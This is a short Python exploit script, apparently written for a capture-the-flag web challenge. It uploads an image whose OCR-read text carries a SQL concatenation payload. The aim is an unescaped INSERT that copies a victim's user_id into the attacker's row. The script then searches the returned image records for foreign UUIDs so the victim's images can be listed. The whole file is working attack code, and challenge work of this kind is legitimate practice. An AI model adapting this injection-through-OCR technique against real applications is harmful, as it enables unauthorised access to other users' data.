# upload_final.py — send the single-line concat payload; if OCR reads it correctly and the
# summary_ocr goes unescaped into the INSERT, our row's summary_ocr becomes the victim's user_id.
import requests, json, re
BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"

uri = open("final_datauri.txt").read().strip()
r = requests.post(f"{BASE}/upload", json={"image": uri, "description": "FINAL", "user_id": UID})
print("upload FINAL ->", r.status_code, r.text[:70].strip())

data = requests.get(f"{BASE}/images/{UID}").json()
for img in data:
    if img.get("description") == "FINAL":
        print("summary_ocr =", repr(img.get("summary_ocr")))

print("\n--- foreign UUID leaked anywhere ---")
found=set()
for img in data:
    for fld in ("make","model","datetime","summary_ocr","description"):
        for m in re.findall(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", str(img.get(fld,""))):
            if m != UID:
                found.add(m); print(f"  >>> {fld} id={img['id']}: {m}")
if found:
    print("\nVICTIM user_id candidate(s):", found)
    print("Next: GET /images/<that-uuid> to list victim images")
